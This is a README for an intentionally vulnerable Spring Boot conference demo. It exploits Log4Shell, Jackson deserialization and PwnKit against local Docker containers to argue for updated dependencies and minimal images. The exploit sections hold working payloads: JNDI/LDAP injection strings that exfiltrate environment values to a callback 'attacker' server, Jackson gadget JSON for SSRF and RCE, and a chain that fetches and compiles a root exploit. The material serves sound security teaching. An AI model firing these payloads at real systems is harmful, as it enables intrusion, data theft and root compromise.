# 🔓 Vulnerable Application — Security Demo

> **⚠️ FOR CONFERENCE DEMO PURPOSES ONLY — DO NOT DEPLOY TO PRODUCTION ⚠️**

This Spring Boot application demonstrates **real-world exploitation** of vulnerable
**Java dependencies** and **OS packages** to show why you must keep both up-to-date
and use minimal Docker images.

### Three vulnerability categories demonstrated:

| # | Category | CVE | What's exploited |
|---|----------|-----|-----------------|
| 1 | **Java Library** | CVE-2021-44228 (Log4Shell) | `log4j-core 2.14.1` — RCE via logging user input |
| 2 | **Java Library** | CVE-2019-14379 (Jackson) | `jackson-databind 2.9.10` — RCE via JSON deserialization |
| 3 | **OS Package** | CVE-2021-4034 (PwnKit) | `policykit-1` (pkexec SUID) — local privilege escalation to root |

---

## 🏗️ Quick Start

```bash
# Start everything: 3 app variants + callback server
docker compose up

# Or individually:
docker compose up vuln-root callback        # Root + old image (port 8080)
docker compose up vuln-escalation callback  # Non-root + PwnKit (port 8081)
docker compose up vuln-safe callback        # Minimal secure image (port 8082)
```

**Callback server dashboard:** http://localhost:9999/dashboard/live

---

## 🐳 Three Docker Images Compared

| Image | Dockerfile | User | Base | Packages | Port |
|-------|-----------|------|------|----------|------|
| `vuln-app:root` | `Dockerfile.root` | `root` | temurin:17.0.5 (old) | gcc, curl, wget, nc, pkexec, sudo | 8080 |
| `vuln-app:escalation` | `Dockerfile.escalation` | `appuser` | temurin:17.0.5 (old) | gcc, curl, nc, pkexec | 8081 |
| `vuln-app:safe` | `Dockerfile.nonroot` | `appuser` | temurin:25 (latest) | None | 8082 |

---

## 💥 Demo 1 — Log4Shell (CVE-2021-44228, CVSS 10.0)

**Vulnerability:** `log4j-core 2.14.1` interprets JNDI lookup expressions in log messages.
The developer just logs user input — standard practice. No code mistake needed.

```java
// This code looks innocent — the vulnerability is in the dependency:
log.info("Product search query: {}", q);
```

### Setup — Start callback server

```bash
# Terminal 1: start the Spring Boot callback server
cd "../Callback Server"
../mvnw spring-boot:run
# Open http://localhost:9999/dashboard/live on a second screen
```

### Exploit

```bash
# Normal search — works fine
curl "http://localhost:8080/api/products/search?q=shirt"

# 💀 JNDI injection — Log4j makes outbound LDAP request to attacker
curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://host.docker.internal:9999/log4shell-proof}"

# 💀 Exfiltrate environment variables via DNS/LDAP
curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://\${java:version}.host.docker.internal:9999/exfil}"
curl "http://localhost:8080/api/products/search?q=\${jndi:ldap://\${env:HOSTNAME}.host.docker.internal:9999/exfil}"
```

**Watch the callback server dashboard** — you'll see the incoming request, proving the server
made an outbound connection to the attacker. In a real attack, this LDAP server returns a
malicious Java class that executes arbitrary code on the victim.

---

## 💥 Demo 2 — Jackson Deserialization RCE (CVE-2019-14379)

**Vulnerability:** `jackson-databind 2.9.10` with `enableDefaultTyping()` allows attackers
to embed Java class names in JSON payloads, instantiating arbitrary objects on the server.

```java
// Legacy configuration — common in older codebases:
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // ← this one line makes you vulnerable
```

### Exploit

```bash
# Normal JSON import — works fine
curl -X POST http://localhost:8080/api/users/import \
  -H "Content-Type: application/json" \
  -d '{"name": "Alice", "email": "alice@conf.io"}'

# 💀 Instantiate java.net.URL — causes SSRF (server connects to attacker)
curl -X POST http://localhost:8080/api/users/import \
  -H "Content-Type: application/json" \
  -d '["java.net.URL", "http://host.docker.internal:9999/jackson-ssrf"]'

# 💀 Attempt class instantiation for RCE (gadget-dependent)
curl -X POST http://localhost:8080/api/users/import \
  -H "Content-Type: application/json" \
  -d '["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://host.docker.internal:9999/jackson-rce","autoCommit":true}]'
```

---

## 💥 Demo 3 — Full Exploit Chain: Log4Shell → RCE → PwnKit (CVE-2021-4034)

**This is the crown jewel of the demo**: a single HTTP request leads to full root
compromise, exploiting BOTH a Java library vulnerability AND an OS package vulnerability.

### How the chain works

```
┌──────────────────────────────────────────────────────────────────────────────┐
│ 1. Attacker sends a single curl request to the search endpoint              │
│    curl "http://victim:8081/api/products/search?q=${jndi:ldap://...}"       │
│                                                                              │
│ 2. Log4j 2.14.1 interprets the JNDI lookup in the log message              │
│    (CVE-2021-44228 — the Java library vulnerability)                        │
│                                                                              │
│ 3. Victim's JVM connects to attacker's LDAP server (port 1389)             │
│                                                                              │
│ 4. LDAP server responds: "load ExploitPayload.class from attacker HTTP"     │
│                                                                              │
│ 5. Victim downloads and executes the malicious class                         │
│    → The class runs: curl pwnkit.c from attacker, gcc compiles it, runs it  │
│                                                                              │
│ 6. PwnKit exploits the SUID pkexec binary (CVE-2021-4034 — the OS vuln)    │
│    → uid=0(root) — FULL SYSTEM COMPROMISE                                  │
└──────────────────────────────────────────────────────────────────────────────┘
```

### The attack — ONE curl command

```bash
# Start the full stack (victim + attacker infrastructure)
docker compose up vuln-escalation callback

# Open callback dashboard on projector: http://localhost:9999/dashboard/live

# 💀 THE ATTACK — a single HTTP GET that leads to root:
curl "http://localhost:8081/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"
```

**What happens in sequence (visible in callback server logs):**
1. Callback server shows: "🎯 LDAP lookup received!" — Log4Shell triggered
2. Callback server shows: "🎯 Victim downloaded PwnKit exploit source!" — RCE confirmed
3. Victim container logs show: `uid=0(root)` — privilege escalation complete

### Why this works on the escalation image

The `Dockerfile.escalation` has three things that make this possible:
- **`log4j-core 2.14.1`** — the Java library vulnerability (JNDI lookup in log messages)
- **`-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`** — simulates older JVM config (default before Java 8u191, still common in legacy deployments)
- **`policykit-1` + `gcc`** — OS packages that enable privilege escalation

### Same attack on the SAFE image — completely blocked

```bash
# Try the same attack on the safe image (port 8082)
curl "http://localhost:8082/api/products/search?q=\${jndi:ldap://callback:1389/pwnkit}"
```

**On the safe image:**
- ✅ Log4j JNDI lookup still triggers (the Java library is still vulnerable)
- ✅ LDAP connection is made to attacker
- ❌ But `trustURLCodebase=false` (modern JVM default) — **class loading blocked**
- ❌ Even if somehow loaded: no `gcc`, no `pkexec` — nothing to exploit

**The point:** Keeping Java updated (JNDI fix), using minimal images (no gcc, no pkexec),
and running modern base images blocks the ENTIRE chain — even if the vulnerable library is present.

---

## 📊 Trivy Scan Comparison

Run security scans to show the CVE difference between images:

```bash
# Scan all three
trivy image vuln-app:root
trivy image vuln-app:escalation
trivy image vuln-app:safe

# Quick HIGH+CRITICAL comparison
echo "=== ROOT ===" && trivy image --quiet --severity HIGH,CRITICAL vuln-app:root | tail -5
echo "=== ESCALATION ===" && trivy image --quiet --severity HIGH,CRITICAL vuln-app:escalation | tail -5
echo "=== SAFE ===" && trivy image --quiet --severity HIGH,CRITICAL vuln-app:safe | tail -5
```

Expected result:
- `vuln-app:root` → **100+ HIGH/CRITICAL CVEs** (old OS + all packages)
- `vuln-app:escalation` → **80+ CVEs** (old OS + fewer packages)
- `vuln-app:safe` → **~0 OS CVEs** (modern image, Java lib CVEs remain in JAR)

---

## 🤖 GitHub Actions — Automated Demo

A workflow at `.github/workflows/demo-vulnerable-app.yml` runs all demos automatically:

1. Go to **Actions** tab → select **"🔓 Vulnerable App — Full Demo"**
2. Click **"Run workflow"**
3. Results appear in the **Summary** tab with formatted tables

The workflow runs 4 parallel jobs:
- **Log4Shell demo** — triggers JNDI callback, shows server logs
- **Jackson demo** — sends malicious JSON, shows SSRF callback
- **PwnKit demo** — escalates to root on vulnerable image, fails on safe image
- **CVE scan comparison** — Trivy scans all 3 images, generates comparison table

---

## 🎯 Callback Server

A Spring Boot app at `../Callback Server/` that acts as the "attacker's server":

```bash
cd "../Callback Server"
../mvnw spring-boot:run
```

- **Live dashboard:** http://localhost:9999/dashboard/live (auto-refreshes, great for projector)
- **JSON API:** http://localhost:9999/dashboard
- **Clear:** `curl -X DELETE http://localhost:9999/dashboard`

All incoming requests are logged — proves the vulnerable app made outbound connections.

---

## 🛡️ Key Takeaways

1. **Update Java dependencies** — Log4Shell and Jackson CVEs are silent killers. Scanners (OWASP, Renovate, Dependabot) catch them automatically.
2. **Update OS packages / base images** — Old images ship hundreds of CVEs. PwnKit was in every Linux distro for 12 years.
3. **Use minimal images** — No shell tools, no gcc, no SUID binaries = nothing to exploit post-RCE.
4. **Running as non-root is necessary but NOT sufficient** — Vulnerable SUID binaries (pkexec) let attackers escalate anyway.
5. **Scan everything** — Use Trivy/Grype in CI/CD to catch both OS and library vulnerabilities.

---

## 🧹 Cleanup

```bash
docker compose down --rmi all
```



